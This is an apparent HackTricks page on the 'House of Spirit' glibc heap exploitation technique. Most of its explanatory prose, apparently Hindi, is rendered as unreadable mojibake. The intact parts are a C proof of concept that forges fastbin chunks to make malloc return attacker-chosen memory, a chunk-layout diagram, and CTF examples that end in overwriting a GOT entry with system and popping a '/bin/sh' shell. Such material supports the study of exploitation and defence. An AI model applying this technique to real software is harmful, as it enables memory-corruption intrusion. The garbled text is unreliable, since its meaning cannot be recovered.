# House of Spirit

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ GCP рд╣реИрдХрд┐рдВрдЧ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

### рдХреЛрдб

<details>

<summary>рд╕реНрдкрд┐рд░рд┐рдЯ рдХрд╛ рдШрд░</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### рд▓рдХреНрд╖реНрдп

* рдПрдХ рдкрддрд╛ рдЬреЛрдбрд╝рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рддрд╛рдХрд┐ рдмрд╛рдж рдореЗрдВ рдЗрд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ

### рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ

* рдпрд╣ рд╣рдорд▓рд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рджреЛ рдирдХрд▓реА рддреНрд╡рд░рд┐рдд рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдмрдирд╛ рд╕рдХрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рд╕рд╣реА рд░реВрдк рд╕реЗ рдЙрд╕рдХреЗ рдЖрдХрд╛рд░ рдорд╛рди рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдкрд╣рд▓реА рдирдХрд▓реА рдЯреБрдХрдбрд╝реА рдХреЛ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдпрд╣ рдмрд┐рди рдореЗрдВ рдкрд╣реБрдВрдЪ рдЬрд╛рдПред

### рд╣рдорд▓рд╛

* рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдиреЗ рд╡рд╛рд▓реА рдирдХрд▓реА рдЯреБрдХрдбрд╝реА рдмрдирд╛рдПрдВ: рдЖрдкрдХреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╕рд╣реА рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕рд╣реА рдЖрдХрд╛рд░ рджрд┐рдЦрд╛рдиреЗ рд╡рд╛рд▓реА 2 рдирдХрд▓реА рдЯреБрдХрдбрд╝реАрдпрд╛рдВ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ
* рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдкрд╣рд▓реА рдирдХрд▓реА рдЯреБрдХрдбрд╝реА рдХреЛ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреА рдкреНрд░рдмрдВрдзрди рдХрд░реЗрдВ рддрд╛рдХрд┐ рдпрд╣ рддреНрд╡рд░рд┐рдд рдпрд╛ рдЯреАрдХреИрд╢ рдмрд┐рди рдореЗрдВ рдкрд╣реБрдВрдЪ рдЬрд╛рдП рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдЙрд╕ рдкрддреЗ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ

**рдХреЛрдб** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house\_of\_spirit/house\_spirit\_exp/index.html) **рд╕реЗ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рд╣реИ рд╣рдорд▓реЗ рдХреЛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдПред** рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХреЛрдб рд╕реЗ рдпрд╣ рдЫрд╛рдпрд╛рдВрдХ рдЗрд╕реЗ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рд╛рд░рд╛рдВрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ:
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреБрдЫ рд╕реЗрдиреНрдЯреА рдЪреЗрдХреНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рдЪрдВрдХ рдХреЛ рдмрдирд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред
{% endhint %}

## рдЙрджрд╛рд╣рд░рдг

* **CTF** [**https://guyinatuxedo.github.io/39-house\_of\_spirit/hacklu14\_oreo/index.html**](https://guyinatuxedo.github.io/39-house\_of\_spirit/hacklu14\_oreo/index.html)
* **Libc infoleak**: рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдмрджрд▓рдХрд░ рдПрдХ GOT рдкрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ libc рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ CTF рдХреЗ рдкрдарди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ
* **House of Spirit**: "рд░рд╛рдЗрдлрд▓" рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рдЧрд┐рдирдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдХрд╛рдЙрдВрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣рд▓реЗ рдирдХрд▓реА рдЪрдВрдХ рдХрд╛ рдПрдХ рдирдХрд▓реА рдЖрдХрд╛рд░ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдлрд┐рд░ "рд╕рдВрджреЗрд╢" рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЪрдВрдХ рдХреЗ рджреВрд╕рд░реЗ рдЖрдХрд╛рд░ рдХреЛ рдирдХрд▓реА рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдЕрдВрддрддрдГ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддрд╛рдХрд┐ рд╣рдорд╛рд░рд╛ рдкрд╣рд▓рд╛ рдирдХрд▓реА рдЪрдВрдХ рдореБрдХреНрдд рд╣реЛ рдЬрд╛рдПред рдлрд┐рд░, рд╣рдо рдЗрд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХреЗ рдЕрдВрджрд░ "рд╕рдВрджреЗрд╢" рдХреЛ рдХрд╣рд╛рдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╡рд╣рд╛рдВ рд╣реЛрдЧрд╛ред рдлрд┐рд░, рдЗрд╕реЗ `scanf` рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЗ рдЕрдВрджрд░ рдЗрдВрдЯреНрд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдЗрдВрдЯреНрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИ, рддрд╛рдХрд┐ рд╣рдо рдЗрд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рдЕрдзрд┐рд░реЛрдкрд┐рдд рдХрд░ рд╕рдХреЗрдВред\
рдЕрдЧрд▓реА рдмрд╛рд░ `scanf` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо `"/bin/sh"` рдЗрдирдкреБрдЯ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рд╢реИрд▓ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред

* [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
* **Glibc leak**: рдЕрдЕрдирд┐рддреАрдХреГрдд рд╕реНрдЯреИрдХ рдмрдлрд░ред
* **House of Spirit**: рд╣рдо рд╣реАрдк рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХреЗ рдПрдХ рдЧреНрд▓реЛрдмрд▓ рдПрд░реЗ рдХреЗ рдкрд╣рд▓реЗ рдЗрдВрдбреЗрдХреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ рдПрдХрд▓ рдмрд╛рдЗрдЯ рд╕рдВрд╢реЛрдзрди рдХреЗ рд╕рд╛рде, рд╣рдо рдПрдХ рд╡реИрдз рдЪрдВрдХ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдирдХрд▓реА рдЪрдВрдХ рдкрд░ `рдореБрдХреНрддрд┐` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рд╣рдо рдлрд┐рд░ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдПрдХ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХреНрд╕ рд╕реНрдерд┐рддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред рдЙрд╕рдХреЗ рд╕рд╛рде, рдПрдХ рд╕рд░рд▓ Tcache poisoning рд╣рдорд▓рд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдПрдХ рдЕрд░реНрдмрд┐рдЯреНрд░реЗ рд░рд╛рдЗрдЯ рдкреНрд░рд╛рдЗрдорд┐рдЯрд┐рд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

## рд╕рдВрджрд░реНрдн

* [https://heap-exploitation.dhavalkapil.com/attacks/house\_of\_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house\_of\_spirit)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}
